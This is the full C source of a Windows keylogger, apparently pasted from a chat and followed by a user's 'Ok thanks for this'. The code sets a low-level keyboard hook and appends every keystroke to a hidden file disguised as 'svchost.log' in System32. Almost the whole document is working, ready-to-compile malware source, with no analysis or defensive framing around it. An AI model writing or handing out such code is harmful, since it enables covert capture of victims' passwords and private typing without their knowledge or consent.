// simple_keylogger.c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

// Path where the keystrokes will be stored (hidden file)
const char *logPath = "C:\\Windows\\System32\\svchost.log";

// Buffer for captured keys
char keystroke[16];

// Callback invoked for every keystroke
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Translate virtual key to ASCII character
            DWORD vkCode = p->vkCode;
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            WORD ascii;
            int result = ToAscii(vkCode, p->scanCode, keyboardState, &ascii, 0);
            if (result == 1) {
                sprintf(keystroke, "%c", (char)ascii);
                // Append to log file
                HANDLE hFile = CreateFileA(logPath, FILE_APPEND_DATA,
                                          FILE_SHARE_READ, NULL, OPEN_ALWAYS,
                                          FILE_ATTRIBUTE_HIDDEN, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(hFile, keystroke, 1, &written, NULL);
                    CloseHandle(hFile);
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Entry point
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // Install low‑level keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);
    if (!hook) {
        MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    // Message loop – keeps the process alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    UnhookWindowsHookEx(hook);
    return 0;
}
Ok thanks for this
